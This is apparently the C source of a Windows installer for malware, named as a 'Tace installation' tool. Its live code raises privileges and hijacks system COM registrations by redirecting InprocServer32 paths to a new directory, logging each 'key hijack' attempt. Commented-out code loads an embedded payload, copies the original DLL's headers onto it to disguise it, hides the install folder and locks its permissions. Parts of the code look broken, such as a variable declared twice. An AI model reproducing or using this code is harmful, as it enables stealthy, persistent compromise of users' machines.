/**
 * main.c
 * Binary for managing Tace installation.
 *
 * © 2018 fereh
 */

#include <Windows.h>
#include <strsafe.h>
#include <Sddl.h>
#include <Aclapi.h>
#include <DbgHelp.h>

#include "ntreg.h"
#include "token.h"
#include "log.h"
//#include "resource.h"
#include "Compressapi.h"

#define LogError(errorCode) WriteErrorLog(L"Line %d (0x%x)", __LINE__, errorCode)
#define SetError(errorCode) LogError(errorCode); error = TRUE;
#define ReturnError(errorCode) SetError(errorCode); __leave;

BOOL Install()
{
	NTSTATUS statusCode;
	BOOL error = FALSE;

	HANDLE comKey = NULL;
	HANDLE heapHandle = GetProcessHeap();

	WCHAR installDir[MAX_PATH];
	WCHAR oldPath[MAX_PATH];
	WCHAR newPath[MAX_PATH];

	PWSTR clsid;

	/*HANDLE fileHandle;
	PBYTE fileBase;
	DWORD fileSize;

	IMAGE_NT_HEADERS *ntHeader;
	IMAGE_NT_HEADERS *newHeader;

	HRSRC versionHandle;
	BYTE *versionBase;*/

	PCWSTR clsid, clsids[] =
	{
		L"{1108BE51-F58A-4CDA-BB99-7A0227D11D5E}",
		L"{5D08B586-343A-11D0-AD46-00C04FD8FDFF}",
		L"{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}"
	};

	PCWSTR privileges[] =
	{
		SE_SECURITY_NAME,
		SE_BACKUP_NAME,
		SE_RESTORE_NAME
	};
	
	__try
	{

		if (!EnableTokenPrivileges(NULL, privileges, sizeof(privileges), TRUE))
		{
			ReturnError(GetLastError());
		}

		for (DWORD i = 0, l = sizeof(clsids) / sizeof(PWSTR); i < l; ++i)
		{
			clsid = clsids[i];

			WriteInfoLog(L"Attempting '%s' key hijack", clsid);

			StringCbPrintfW(oldPath,
				sizeof(oldPath),
				L"CLSID\\%s\\InprocServer32",
				clsid);

			statusCode = NtRegCreateKey(
				&comKey,
				HKEY_CLASSES_ROOT,
				oldPath,
				KEY_ATTRIBUTE_NORMAL);

			if (statusCode != STATUS_SUCCESS)
			{
				LogError(statusCode);

				if (i == l - 1)
				{
					__leave;
				}

				continue;
			}

			break;
		}

		// get old path
		statusCode = NtRegGetExpandString(
			comKey,
			NULL,
			oldPath,
			sizeof(oldPath));

		if (statusCode != STATUS_SUCCESS)
		{
			ReturnError(statusCode);
		}

		// create new path
		StringCbCopyW(installDir, 2 * sizeof(WCHAR), oldPath); // copy system drive
		StringCbCatW(installDir, sizeof(installDir), L"\\Windows\\Installer\\");
		StringCbCatW(installDir, sizeof(installDir), clsid);

		StringCbCopyW(newPath, sizeof(newPath), installDir);
		StringCbCatW(newPath, sizeof(newPath), wcsrchr(oldPath, L'\\'));

		// set new path
		statusCode = SetRegExpandString(
			comKey,
			NULL,
			newPath,
			sizeof(newPath));

		if (statusCode != STATUS_SUCCESS)
		{
			ReturnError(statusCode);
		}

		// create install directory
		if (!CreateDirectoryW(installDir, NULL))
		{
			if (GetLastError() != ERROR_ALREADY_EXISTS)
			{
				ReturnError(GetLastError());
			}
		}

		// load old file to memory
		/*fileHandle = CreateFileW(
			oldPath,
			GENERIC_READ,
			FILE_SHARE_READ,
			NULL,
			OPEN_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL);

		if (fileHandle == INVALID_HANDLE_VALUE)
		{
			LogError();
			return FALSE;
		}

		fileSize = GetFileSize(fileHandle, NULL);
		fileBase = (PBYTE)HeapAlloc(heapHandle, 0, fileSize);

		if (fileBase == NULL)
		{
			LogError();
			return FALSE;
		}

		if (!ReadFile(
			fileHandle,
			fileBase,
			fileSize,
			NULL,
			NULL))
		{
			LogError();
			return FALSE;
		}

		// get old headers
		newHeader = ImageNtHeader(fileBase);

		// get old version info
		versionHandle = LoadResource(
			fileBase,
			FindResourceW(
				fileBase,
				MAKEINTRESOURCE(VS_VERSION_INFO),
				RT_VERSION));

		versionBase = LockResource(versionHandle);*/

		/*WriteInfoLog(L"Loading payload");

		HRSRC cabInfo;
		HANDLE cabHandle;
		PBYTE cabBase;
		DWORD cabSize;
		DECOMPRESSOR_HANDLE dcHandle;
		DWORD dcSize;
		PBYTE dcBuffer;

		cabInfo = FindResourceW(
			NULL,
			MAKEINTRESOURCEW(IDR_CABINET),
			RT_RCDATA);

		cabSize = SizeofResource(NULL, cabInfo);
		cabHandle = LoadResource(NULL, cabInfo);
		cabBase = LockResource(cabHandle);

		WriteInfoLog(L"Decompressing payload");

		if (!CreateDecompressor(
			COMPRESS_ALGORITHM_MSZIP,
			NULL,
			&dcHandle))
		{
			LogError();
			return FALSE;
		}

		if (!Decompress(
			dcHandle,
			cabBase,
			cabSize,
			NULL,
			0,
			&dcSize))
		{
			LogError();
			return FALSE;
		}

		dcBuffer = HeapAlloc(heapHandle, 0, dcSize);

		if (!Decompress(
			dcHandle,
			cabBase,
			cabSize,
			dcBuffer,
			dcSize,
			&dcSize))
		{
			LogError();
			return FALSE;
		}




		ntHeader = ImageNtHeader(fileBase);

		WriteInfoLog(L"Patching payload");*/

		// transfer old headers to new file
		/*ntHeader->FileHeader.TimeDateStamp = newHeader->FileHeader.TimeDateStamp;
		ntHeader->OptionalHeader.MajorOperatingSystemVersion = newHeader->OptionalHeader.MajorOperatingSystemVersion;
		ntHeader->OptionalHeader.MinorOperatingSystemVersion = newHeader->OptionalHeader.MinorOperatingSystemVersion;
		ntHeader->OptionalHeader.MajorImageVersion = newHeader->OptionalHeader.MajorImageVersion;
		ntHeader->OptionalHeader.MinorImageVersion = newHeader->OptionalHeader.MinorImageVersion;
		ntHeader->OptionalHeader.MajorSubsystemVersion = newHeader->OptionalHeader.MajorSubsystemVersion;
		ntHeader->OptionalHeader.MinorSubsystemVersion = newHeader->OptionalHeader.MinorSubsystemVersion;*/

		// transfer old version info to new file

		/*HeapFree(heapHandle, 0, fileBase);
		CloseHandle(fileHandle);

		WriteInfoLog(L"Writing payload to '%s'", installDir);

		fileHandle = CreateFileW(
			newPath,
			GENERIC_ALL,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL);

		if (fileHandle == INVALID_HANDLE_VALUE)
		{
			LogError();
			return FALSE;
		}

		if (!WriteFile(
			fileHandle,
			fileBase,
			fileSize,
			NULL,
			NULL))
		{
			LogError();
			return FALSE;
		}

		CloseHandle(fileHandle);

		WriteInfoLog(L"Restricting payload access");

		if (!SetFileAttributesW(
			installDir,
			FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM))
		{
			LogError();
			return FALSE;
		}

		SECURITY_DESCRIPTOR *desc;
		PACL dacl;
		BOOL daclDefaulted;
		BOOL daclPresent;

		if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
			L"D:PAI(D;CIOI;FRFX;;;WD)(A;CIOI;FA;;;SY)",
			SDDL_REVISION_1,
			&desc,
			NULL))
		{
			return GetLastError();
		}

		GetSecurityDescriptorDacl(desc, &daclPresent, &dacl, &daclDefaulted);

		SetNamedSecurityInfoW(
			installDir,
			SE_FILE_OBJECT,
			DACL_SECURITY_INFORMATION |
			PROTECTED_DACL_SECURITY_INFORMATION,
			NULL,
			NULL,
			dacl,
			NULL);

		LocalFree(desc);*/

	}

	__finally
	{
		if (comKey) CloseHandle(comKey);
	}

	return !error;
}

BOOL Uninstall()
{

	return FALSE;
}

int CALLBACK wWinMain(HINSTANCE instance, HINSTANCE prevInstance, PWSTR cmdLine, int showCode)
{
	BOOL (*Command)() = Install; // default

	// TODO: enable/disable log option
	CreateLog(L"installer.log");
	WriteInfoLog(L"Installer started");

	if (*cmdLine)
	{
		WriteInfoLog(L"Executing '%s' command", cmdLine);

		if (_wcsicmp(cmdLine, L"install") == 0) Command = Install;
		else if (_wcsicmp(cmdLine, L"uninstall") == 0) Command = Uninstall;
		
		else
		{
			WriteFatalLog(L"Command not found");
			Command = NULL;
		}
	}

	if (Command)
	{
		if (Command())
		{
			WriteInfoLog(L"Command succeeded");
		}
		else
		{
			WriteFatalLog(L"Command failed");
		}
	}

	WriteInfoLog(L"Installer stopped");
	CloseLog();

	return 0;
}